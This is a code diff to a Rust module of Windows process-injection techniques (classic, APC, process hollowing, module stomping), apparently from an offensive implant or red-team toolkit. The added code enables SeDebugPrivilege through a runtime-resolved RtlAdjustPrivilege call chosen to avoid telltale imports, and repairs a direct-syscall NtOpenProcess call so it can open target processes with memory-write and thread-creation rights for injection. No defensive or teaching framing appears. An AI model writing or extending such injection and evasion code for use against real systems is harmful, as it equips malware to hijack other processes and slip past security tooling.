@@ -15,6 +15,7 @@ pub mod stomp;
 pub use classic::inject_classic;
 #[cfg(target_os = "windows")]
 pub use apc::inject_apc;
+pub use apc::inject_classic_spawn;
 #[cfg(target_os = "windows")]
 pub use hollow::inject_hollow;
 #[cfg(target_os = "windows")]
@@ -26,7 +27,7 @@ pub use stomp::inject_stomp;
 #[cfg(all(target_os = "windows", feature = "inject-stomp"))]
 pub use stomp::inject_stomp_remote;
 
-pub type InjectResult = Result<(), &'static str>;
+pub type InjectResult = Result<(), String>;
 
 #[cfg(target_os = "windows")]
 pub fn pid_by_name(name: &str) -> Option<u32> {
@@ -74,8 +75,9 @@ pub fn pid_by_name(name: &str) -> Option<u32> {
 }
 
 #[cfg(target_os = "windows")]
-pub fn open_process_rw(pid: u32) -> Option<isize> {
+pub fn open_process_rw(pid: u32) -> Result<isize, i32> {
     use crate::syscall::{nt_open_process, ClientId};
+    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 
     const PROCESS_VM_READ: u32 = 0x0010;
     const PROCESS_VM_WRITE: u32 = 0x0020;
@@ -88,20 +90,56 @@ pub fn open_process_rw(pid: u32) -> Option<isize> {
         | PROCESS_CREATE_THREAD
         | PROCESS_QUERY_INFORMATION;
 
+    // Enable SeDebugPrivilege (privilege index 20) via RtlAdjustPrivilege — single ntdll
+    // call, avoids needing advapi32 imports. Args: (Privilege, Enable, Client, WasEnabled).
+    unsafe {
+        let ntdll = b"ntdll.dll\0";
+        let hmod = GetModuleHandleA(ntdll.as_ptr());
+        if hmod != 0 {
+            let fn_name = b"RtlAdjustPrivilege\0";
+            if let Some(func) = GetProcAddress(hmod, fn_name.as_ptr()) {
+                type RtlAdjPrivFn = unsafe extern "system" fn(u32, u8, u8, *mut u8) -> i32;
+                let f: RtlAdjPrivFn = core::mem::transmute(func);
+                let mut was_enabled: u8 = 0;
+                f(20, 1, 0, &mut was_enabled);
+            }
+        }
+    }
+
+    // NtOpenProcess requires a non-NULL ObjectAttributes; the kernel probes the pointer
+    // before ObCallbacks fire, so NULL → STATUS_ACCESS_VIOLATION (0xc0000005).
+    // A zero-initialized struct with only Length set is the minimal valid form.
+    #[repr(C)]
+    struct ObjectAttributes {
+        length: u32,
+        _pad: u32,
+        root_directory: usize,
+        object_name: usize,
+        attributes: u32,
+        _pad2: u32,
+        security_descriptor: usize,
+        security_qos: usize,
+    }
+    let mut oa = ObjectAttributes {
+        length: core::mem::size_of::<ObjectAttributes>() as u32,
+        _pad: 0, root_directory: 0, object_name: 0,
+        attributes: 0, _pad2: 0, security_descriptor: 0, security_qos: 0,
+    };
+
     let mut handle: isize = 0;
     let mut cid = ClientId { process: pid as isize, thread: 0 };
     let status = unsafe {
         nt_open_process(
             &mut handle,
             ACCESS,
-            core::ptr::null_mut(),
+            &mut oa as *mut ObjectAttributes as *mut u8,
             &mut cid,
         )
     };
     if status < 0 || handle == 0 {
-        None
+        Err(if status < 0 { status } else { -1i32 })
     } else {
-        Some(handle)
+        Ok(handle)
     }
 }
 
